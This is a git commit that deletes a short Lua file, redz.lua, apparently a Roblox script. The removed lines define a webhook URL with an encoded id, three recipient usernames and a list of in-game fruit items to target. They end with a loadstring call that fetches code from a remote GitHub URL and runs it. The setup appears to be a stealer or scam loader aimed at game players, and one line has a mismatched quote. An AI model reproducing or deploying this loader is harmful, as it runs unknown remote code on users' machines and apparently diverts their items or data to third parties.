81cef3e03d1937593098cebbb8cdba62ff623705
RedzNew <nm.mastercdk@gmail.com>
2025-04-08 20:46:46 +0700

    Delete redz.lua

--- redz.lua
+++
@@ -1,5 +0,0 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=akRVcTUyZGNXZ1h4WTNCbXJRX1BSZzpOY3JfQ1phSkRnUWVteUNOb2tYX2Ewc2YtZ1FSYzFOcEU3TGl2ejF6MkpyU2Y0Y19rdGEyQTh2Wlp2a2dRdTJMRkxuTDNHTjVuRDNlSVI3NEFHM2VIQzRSUGl2aV9KaDRTcFd6b2ZGczUyNWE2cVZPREtLNEtQMVM5cXdEcUJJQk50YW5YRXNMMUhEOW9WTFM2VWpHdThHY2FaRGxqYk5Zdm1YT0tocUZfUkk"
-Usernames = {"tarronfj", "mfzgnr", "fritzowjr'}
-FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
